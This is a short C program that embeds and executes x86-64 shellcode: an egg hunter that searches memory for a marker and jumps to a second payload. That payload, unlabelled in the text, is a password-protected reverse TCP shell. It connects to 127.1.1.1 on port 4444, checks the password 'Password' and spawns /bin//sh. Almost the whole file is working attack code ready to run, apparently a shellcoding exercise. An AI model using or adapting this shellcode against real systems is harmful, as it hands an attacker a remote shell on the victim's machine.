#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50\x48\x31\xc0\xb0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x04\x2a\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x48\x31\xf6\x48\x83\xc6\x03\x48\x31\xc0\x04\x21\x48\xff\xce\x0f\x05\x75\xf4\x48\x31\xc0\x48\x89\xe6\x48\x31\xd2\x80\xc2\x08\x0f\x05\x48\x89\xe7\x48\xb8\x50\x61\x73\x73\x77\x6f\x72\x64\x48\xaf\x75\x20\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x48\xff\xcf\x0f\x05";

unsigned char egghunter[] = \
"\x48\x31\xdb\xbb\x90\x50\x90\x50\x48\x31\xff\x48\x31\xd2\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x04\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xe9\x39\x1a\x75\xea\x39\x5a\x04\x75\xe5\xff\xe2";

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));
	printf("Egg Hunter Length: %d\n", strlen(egghunter));

        int (*ret)() = (int(*)())egghunter;

        ret();

	return 0;
}